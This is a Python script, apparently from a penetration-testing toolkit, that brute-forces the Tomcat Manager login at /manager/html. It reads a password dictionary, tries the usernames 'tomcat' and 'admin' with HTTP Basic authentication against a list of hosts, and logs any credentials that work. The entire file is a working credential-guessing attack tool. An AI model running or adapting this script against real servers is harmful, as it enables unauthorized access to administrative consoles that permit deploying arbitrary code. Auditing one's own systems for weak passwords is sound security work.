# -*- coding: utf-8 -*-
# Created by restran on 2016/10/10
from __future__ import unicode_literals, absolute_import

import base64
import logging

import requests
import os
import sys

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import TaskExecutor, read_dict

logger = logging.getLogger(__name__)

"""
Tomcat 弱口令爆破
"""

found_password = []

ip_list = ['localhost:8080']
name_list = ['tomcat', 'admin']


def weak_pass(password, url):
    for name in name_list:
        headers = {'Authorization': 'Basic %s==' % (base64.b64encode(name + ':' + password))}
        try:
            r = requests.get(url, headers=headers, timeout=3)
            if r.status_code == 200:
                logger.info('[True] %s %s:%s' % (url, name, password))
                found_password.append((url, '%s:%s' % (name, password)))
                return True
            else:
                logger.info('[False] %s %s:%s' % (url, name, password))
        except:
            logger.info('[False] %s %s:%s' % (url, name, password))

    return False


def main():
    password_list = read_dict('password.dic')
    for ip in ip_list:
        url = 'http://%s/manager/html' % ip
        executor = TaskExecutor(password_list)
        executor.run(weak_pass, url)

    for t in found_password:
        logger.info('%s password is %s' % t)


if __name__ == "__main__":
    main()
